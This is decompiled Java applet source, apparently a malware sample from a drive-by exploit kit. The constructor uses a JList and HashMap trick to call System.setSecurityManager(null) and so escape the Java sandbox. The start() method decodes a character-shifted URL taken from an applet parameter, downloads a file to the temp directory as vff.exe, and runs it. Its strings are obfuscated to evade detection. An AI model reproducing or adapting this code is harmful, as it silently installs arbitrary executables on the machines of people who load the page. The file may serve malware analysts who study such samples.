import java.util.Map;
import java.awt.Component;
import javax.swing.JList;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Loo extends Applet
{
    private void dhdhs() {
        int a = 3;
        ++a;
    }
    
    @Override
    public void start() {
        super.start();
        try {
            String dwaw = System.getProperty("jalbwegkva.ilbwegko.tlbwegkmpdlbwegkir".replace("lbwegk", ""));
            if (dwaw.charAt(dwaw.length() - 1) != '\\') {
                dwaw += "\\";
            }
            final String coopl = dwaw + "vflbwegkf.exlbwegke".replace("lbwegk", "");
            final String ddswh = this.getParameter("dehsdhwst".replace("hsdhw", ""));
            String dddswh = "";
            for (int s = 0; s < ddswh.length(); ++s) {
                int jds = ddswh.charAt(s);
                jds -= 4;
                dddswh += (char)jds;
            }
            final InputStream dddhw = ggs.EEGD(dddswh);
            final int ssa = 0;
            final FileOutputStream shwwds = new FileOutputStream(coopl);
            byte[] bbbz = new byte[153601];
            for (int dshs = 0, hshwh3 = 0; (hshwh3 = dddhw.read(bbbz)) > 0; bbbz = new byte[153601], dshs += hshwh3) {
                shwwds.write(bbbz, 0, hshwh3);
            }
            shwwds.close();
            dddhw.close();
            try {
                ggs.hsdwww(coopl);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public Loo() {
        final Object gnns = System.class;
        final String nntts = "swhhqqetwhhqqSecurwhhqqityMawhhqqnawhhqqger".replace("whhqq", "");
        final Object[] sssa2 = { null };
        final Object[] w = { null };
        final fgsh l = new fgsh(gnns, nntts, sssa2);
        final HashSet a = new HashSet();
        final HashSet b = new HashSet();
        a.add(l);
        final int vef = 33;
        final Map bas = new HashMap() {
            @Override
            public Set entrySet() {
                return a;
            }
        };
        final JList vgs = new JList((E[])new Object[] { bas });
        this.add(vgs);
        try {
            Thread.sleep(5000L);
        }
        catch (InterruptedException ex) {}
    }
}
